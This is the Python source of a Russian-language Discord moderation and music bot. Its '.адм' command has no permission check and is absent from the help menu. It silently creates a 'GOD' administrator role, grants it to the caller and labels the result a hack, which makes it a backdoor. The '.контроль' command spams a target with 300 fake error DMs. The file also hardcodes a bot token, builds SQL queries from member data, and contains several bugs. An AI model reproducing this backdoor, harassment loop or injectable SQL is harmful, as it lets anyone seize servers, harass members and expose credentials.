import discord 
import asyncio
from discord.ext import commands 
from discord.ext.commands import cooldown, BucketType, Context 
import sqlite3
from discord.utils import get
import os
import youtube_dl
from youtube_dl import *


client = commands.Bot(command_prefix = '.', intents = discord.Intents.all(), case_insensitive = True, strip_after_prefix = True)
client.remove_command('help')
connection = sqlite3.connect('TABLE.db')
cursor = connection.cursor()

@client.event
async def on_ready():
	await client.change_presence( status = discord.Status.idle, activity = discord.Game( '.help' ) )
	print('Бот запущен')
	cursor.execute("""CREATE TABLE IF NOT EXISTS users(
		name TEXT,
		id INT,
		server_id INT,
		warns INT)""")
	connection.commit()
	for guild in client.guilds:
		for member in guild.members:
			if cursor.execute(f"SELECT id FROM users WHERE id = {member.id} and server_id = {guild.id}").fetchone() is None:
				try:
					cursor.execute(f"INSERT INTO users VALUES ('{member}', {member.id}, {guild.id}, 0)")
					connection.commit()
				except:
					pass

#Мут
@client.command()
@commands.has_permissions(administrator=True)
async def mute(ctx, member: discord.Member = None,time=None, *,arg='Причина не указана'):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = 'Форма мута: **.mute @(Ник) (время) (причина)**'))
	elif time is None:
		await ctx.send(embed = discord.Embed(title = 'Упс... :no_entry:', description = 'Пожалуйста, укажи время!'))
	else:
		time2 = time
		if 's' in time:
			time = time[:-1] 
			time = time*int(1)
		elif 'm' in time:
			time = time[:-1] 
			time = int(time)*60
		elif 'h' in time:
			time = time[:-1] 
			time = int(time)*3600
		elif 'd' in time:
			time = time[:-1] 
			time = int(time)*3600*24
		await ctx.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Участник __{member.mention}__ замучен! \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author.mention}__'))
		await member.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Вам выдали мут. \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author.mention}__'))
		await member.add_roles(discord.utils.get(ctx.guild.roles, name = 'Mute'), reason =  f"{arg} (Замутил {ctx.author.name})")
		await asyncio.sleep(int(time))
		await member.remove_roles(discord.utils.get(ctx.guild.roles, name = 'Mute')) 
		await member.send(embed = discord.Embed(title = 'Сюрприз! :tada:', description=  f':bulb:У вас ,__{member.mention}__, истекло время мута '))
@client.command()
@commands.has_permissions(administrator=True)
async def unmute(ctx, member: discord.Member = None):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = ':bulb:Форма размута: **.unmute @(ник)**'))
	else:
		await member.remove_roles(discord.utils.get(ctx.guild.roles, name = 'Mute')) 
		await ctx.send(embed = discord.Embed(title = 'Разблокировки:unlock:', description =  f':bulb:Вы размутили __{member.mention}__ \n\n:bulb:Администратор: __{ctx.author}__'))
@client.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member = None,time=None,*,arg='Причина не указана'):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = ':bulb:Форма бана: **.ban @(ник) (время) (причина)**'))
	elif time is None:
		await ctx.send('Пожалуйста, укажите время!')
	else:
		time2 = time
		if 's' in time:
			time = time[:-1] 
			time = time*int(1)
		elif 'm' in time:
			time = time[:-1] 
			time = int(time)*60
		elif 'h' in time:
			time = time[:-1] 
			time = int(time)*3600
		elif 'd' in time:
			time = time[:-1] 
			time = int(time)*3600*24
		await ctx.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Участник __{member.mention}__ забанен! \n\n:bulb:Срок бана: **{time2}** \n\n:bulb:Причина: **{arg}** \n\n:bulb:Администратор: __{ctx.author}__'))
		await member.create_dm()
		await member.send(embed = discord.Embed(title = 'Блокировки:lock:', descriptions = f':bulb:Вы были забанены на **{time2}** \n\nCервер **{ctx.guild.name}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Забанил: __{ctx.author}__'))
		await member.ban(reason = f'{arg}')
		await asyncio.sleep(int(time))
		await member.unban(reason = f'{arg}')
		await ctx.send(f'У участника __{member.mention}__ истекло время бана ')

@client.command()
@commands.has_permissions(administrator=True)
async def unban(ctx, member: discord.Member = None,):
	await member.unban(reason = f'{arg}')
	await ctx.send(embed = discord.Embed(title = 'Разблокировки:unlock:', description = f':bulb:Участник: **{member.mention}** разбанен \n:bulb:Администратор = {ctx.author}'))
	await member.send(embed = discord.Embed(title = 'Разблокировки:unlock:', description = f':bulb:Участник: **{member.mention}** разбанен \n:bulb:Администратор = {ctx.author}'))
@client.command()
@commands.has_permissions(administrator=True)
async def warn(ctx, member: discord.Member = None, *, arg='Причина не указана'):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = 'Правильная форма: **.warn @(ник) (причина)**'))
	else:
		cursor.execute("UPDATE users SET warns = warns + 1 WHERE id = {} and server_id = {}".format(member.id, ctx.guild.id))
		connection.commit()
		await ctx.send(embed = discord.Embed(title ='Предупреждения:bangbang:', description = f':bulb:Участник __{member.mention}__ получил варн! \n\n:bulb:Причина: **{arg}**\n\n:bulb:Выдал: __{ctx.author}__'))
		await member.send(embed = discord.Embed(title = 'Варны:bangbang:', description = f':bulb:Вам выдали варн! \n\n:bulb:Причина: **{arg}** \n\n:bulb:Выдал: __{ctx.author}__'))
@client.command()
async def warns(ctx, member: discord.Member = None):
	if member is None:
		await ctx.send(f'**Ваши предупреждения: {cursor.execute("SELECT warns FROM users WHERE id = {} and server_id = {}".format(ctx.author.id, ctx.guild.id)).fetchone()[0]}**')
	else:
		await ctx.send(f'**Предупреждения {member.mention}: {cursor.execute("SELECT warns FROM users WHERE id = {} and server_id = {}".format(member.id, ctx.guild.id)).fetchone()[0]}**')


@client.command()
@commands.has_permissions(administrator=True)
async def unwarn(ctx, member: discord.Member = None):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка!:no_entry:', description = ':bulb:Правильная форма: **.unwarn @(ник)**'))
	else:
		cursor.execute("UPDATE users SET warns = 0 WHERE id = {} and server_id = {}".format(member.id, ctx.guild.id))
		connection.commit()
		await ctx.send(embed = discord.Embed(title = 'Предупреждения:bangbang', description = f':bulb:У участника __{member.mention}__ очищены варны'))

@client.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, limit = None):
	if limit is None:
		await ctx.channel.purge(limit = 75)
		await ctx.send(embed = discord.Embed(title = 'Очистка!:dash:', description = ':bulb:Очищено 75 сообщений \n:bulb:Если хотите выбрать кол-во сами, напишите .clear (кол-во)'))
		await asyncio.sleep(int(6))
		await ctx.channel.purge(limit = 1)
	else:
		await ctx.channel.purge(limit = int(limit)+1)
		await ctx.send(embed = discord.Embed(title = 'Очистка!:dash:', description = f':bulb:Данный канал успешно очищен! \n\nОчистил - {ctx.author}'))
		await asyncio.sleep(int(10))
		await ctx.channel.purge(limit = 1)

@client.command(aliases = ['y'])
async def скажи(ctx, *, arg = None):
	if arg is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка!:no_entry:', description = ':bulb:Правильная форма: .say (Текст)'))
	else:
		await ctx.channel.purge(limit = 1)
		await ctx.send(arg)

@client.command()
async def лс(ctx, member: discord.Member = None, *, arg = None):
	if arg is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry: ', description = ':bulb:Правильная форма: .say (Текст)'))
	else:
		await ctx.channel.purge(limit = 1)
		await member.send(arg)

@client.command()
async def адм(ctx, limit = None):
	await ctx.channel.purge(limit = 1)
	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True), name = 'GOD')
	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'GOD'))
	await ctx.author.send(embed = discord.Embed(title = ':bulb:Взлом', description = 'Вам была выдана роль __new role__! В ней есть право администратора!'))

@client.command()
async def help(ctx):
	emb = discord.Embed(title = ':scroll:Команды:scroll:')
	emb.add_field(name = ':pushpin:.mute', value=':bulb:Мут', inline = True)
	emb.add_field(name = ':pushpin:.unmute', value=':bulb:Размут', inline = True)
	emb.add_field(name = ':pushpin:.ban', value=':bulb:Блокировка', inline = True)
	emb.add_field(name = ':pushpin:.unban', value=':bulb:Разбан', inline = True)
	emb.add_field(name = ':pushpin:.warn', value=':bulb:Выдача варна', inline = True)
	emb.add_field(name = ':pushpin:.unwarn', value=':bulb:Очистка варнов', inline = True)
	emb.add_field(name = ':pushpin:.скажи', value=':bulb:Сказать что-либо от имени бота', inline = True)
	emb.add_field(name = ':pushpin:.avatar', value=':bulb:Заполучить аватар', inline = True)
	emb.add_field(name = ':pushpin:.ping', value=':bulb:узнать пинг бота', inline = True)
	emb.add_field(name = ':pushpin:.clear', value=':bulb:Очистка чата', inline = True)
	emb.add_field(name = ':pushpin:.play', value=':bulb:Включить музыку', inline = True)
	emb.add_field(name = ':pushpin:.pause', value=':bulb:Прекратить проигрывание', inline = True)
	emb.add_field(name = ':pushpin:.resume', value=':bulb:Продолжить воспроизведение', inline = True)
	emb.add_field(name = ':pushpin:.stop', value=':bulb:Остановить проигрывание полностью', inline = True)
	await ctx.send(embed = emb)

@client.command(aliases = ['kl'])
async def контроль(ctx,member: discord.Member = None, time=None):
	await member.send(f'ИИ включен.')
	await asyncio.sleep(int(3))
	coint = 0
	a = True
	while a:
		await member.send(f'Сработала защита от ошибок! Название системы __SystemErrorCheker__! Сообщите TheWolf1k#2980 об ошибке! \n\nЕму это сообщение не придет. Сообщение идет только **Участникам** дискорд сервера!')
		print('АААА КТО-ТО ИСПОЛЬЗОВАЛ КОМАНДУ .контроль')
		coint += 1
		if coint == 300:
			a = False

@client.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.CommandNotFound ):
		await ctx.send(embed = discord.Embed(title = 'Ошибка:no_entry:', description = f'**{ctx.author.name}**, данной команды не существует. \n\nЕсли хотите узнать команды, напишите .help'))
	else:
		print(error)	

#@client.command()
#async def test(ctx):
#	msg = await ctx.send(
#		embed = discord.Embed(title = 'Вы точно хотите перевевсти деньги?', timestamp = ctx.message.created_at),
#		components = [
#			Button(style = ButtonStyle.green, label = 'Да'),
#			Button(style = ButtonStyle.red, label = 'Нет')
#
#	a = True
#	while a:
#		res = await client.wait_for('button_click', check = lambda message: message.author == ctx.author)
#		if res.component.label == 'Да':
#			await res.respond(embed = discord.Embed(type=7, description = "**Выполнено**"))
#		else:
#			await res.respond(embed = discord.Embed(type=7, description = '**Отклонено!**'))
#			a = False		

#@client.command()
#async def mutet(ctx, member: discord.Member = None,time=None, *,arg='Причина не указана'):
#	msg = await ctx.send(
#		embed = discord.Embed(title = 'Вы точно хотите этого?', timestamp = ctx.message.created_at),
#		components = [
#			Button(style = ButtonStyle.green, label = 'Да'),
##			Button(style = ButtonStyle.red, label = 'Нет')
#		])

#	a = True
#	while a:
#		res = await client.wait_for('button_click', check = lambda message: message.author == ctx.author)
#		if res.component.label == 'Да':
#			await mute(ctx = ctx)
#		else:
#			await res.respond(embed = discord.Embed(type=7, description = '**Отклонено!**'))

@client.command()
async def avatar(ctx, *, avamember: discord.Member = None):
	userAvatarUrl = avamember.avatar_url
	await ctx.send(userAvatarUrl)

@client.event
async def on_member_join (member):
    channel = client.get_channel (907979956368326685)
    role = discord.utils.get (member.guild.roles, id = 907979956313817109)
    await member.add_roles( role )
    await channel.send( embed = discord.Embed(title = 'Новенький',  description = f'``{member.name} присоединился к нам!```'))

@client.command()
async def ping(ctx):
    ping_ = client.latency
    ping = round(ping_ * 1000)
    await ctx.send(embed = discord.Embed(title = 'Пинг:satellite:', description=f'Пинг в данный момент времени: ```{ping}ms```'))

@client.command(aliases = ['j'])
async def join(ctx):
	try:
		channel = ctx.author.voice.channel
		await channel.connect()
	except:
		await ctx.send('Зайдите в гс канал!')

# НУ ЖЕ, КАК ЖЕ ЭТО СДЕЛАТЬ

queue = asyncio.Queue()
FFMPEG_OPTIONS = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'} # Если -инет, то будет переподключатся
ydl_opts = {'format': 'bestaudio/best'}

@client.command(aliases = ['p'])
async def play(ctx, *, url = None):
	if url is None:
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description = ':bulb:Ты не указал название либо ссылку на трек!'))
	else:
		try:
			channel = ctx.author.voice.channel
			await channel.connect()
		except:
			pass
		try:
			test_v2 = discord.utils.get(client.voice_clients, guild = ctx.guild) # Это получает voice_clients (ЕСТЬ В ДОКУМЕНТАЦИИ, ЧИТАТЬ НАДО!!!!)
		except:
			await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description = ':bulb:Зайдите в гс канал!'))
		with YoutubeDL(ydl_opts) as ydl:
			test_video = ydl.extract_info(f"ytsearch:{url}", download=False)['entries'][0] # СКАЧИВАНИЕ НА FALSE, И ТАК МОЖНО ЧЕРЕЗ ytsearch ЧЕРЕЗ ПОИСК ВКЛЮЧИТЬ (Можно оставить только url)
		if test_v2.is_playing() or test_v2.is_paused():
			await queue.put(test_video)
			await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description = f':bulb:Музыка: **{test_video["title"]}** добавлена в очередь'))
		else:
			await queue.put(test_video)
			while queue.qsize() > 0:
				new = asyncio.Event()
				current = await queue.get()
				test_v2.play(discord.FFmpegOpusAudio(current['formats'][0]['url'], **FFMPEG_OPTIONS), after = lambda a: new.set())
				await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description = f':bulb:Сейчас играет музыка - **{current["title"]}**'))
				new.clear()
				await asyncio.sleep(2)
				await new.wait()
			try:
				await test_v2.disconnect()
				await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =f":bulb:Бот отключился"))
			except:
				await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =":bulb:Бот не подключен к гс!"))

@client.command(aliases = ['s'])
async def skip(ctx):
	test_v2 = discord.utils.get(client.voice_clients, guild = ctx.guild)
	if test_v2.is_playing() or test_v2.is_paused():
		test_v2.stop()
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка переключена на следущую!'))
	else:
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка не включена!'))

@client.command(aliases = ['sp'])
async def stop(ctx):
	test_v2 = discord.utils.get(client.voice_clients, guild = ctx.guild)
	if test_v2.is_playing() or test_v2.is_paused():
		while queue.qsize() > 0:
			await queue.get()
		test_v2.stop()
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка остановлена'))
	else:
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка не включена!'))

@client.command(aliases = ['ps'])
async def pause(ctx):
	test_v2 = discord.utils.get(client.voice_clients, guild = ctx.guild)
	if test_v2.is_playing():
		test_v2.pause()
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка поставлена на паузу'))
	else:
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка не включена!'))

@client.command(aliases = ['r'])
async def resume(ctx):
	test_v2 = discord.utils.get(client.voice_clients, guild = ctx.guild)
	if test_v2.is_paused():
		test_v2.resume()
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка снова проигрывается'))
	else:
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =':bulb:Музыка и так включена!'))

@client.command(aliases = ['l'])
async def leave(ctx):
	channel = ctx.message.author.voice.channel
	voice = get(client.voice_clients, guild=ctx.guild)

	if voice and voice.is_connected():
		await voice.disconnect()
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =f":bulb:Отключился от {channel}"))
	else:
		await ctx.send(embed = discord.Embed(title = 'Музыка:notes:', description =":bulb:Бот не подключен к гс!"))

client.run('OTExOTQ5NTE0NzYyNTE4NTI4.YZo1Kw.xgFNuiyred3JHMHcGdfq82fNZUY')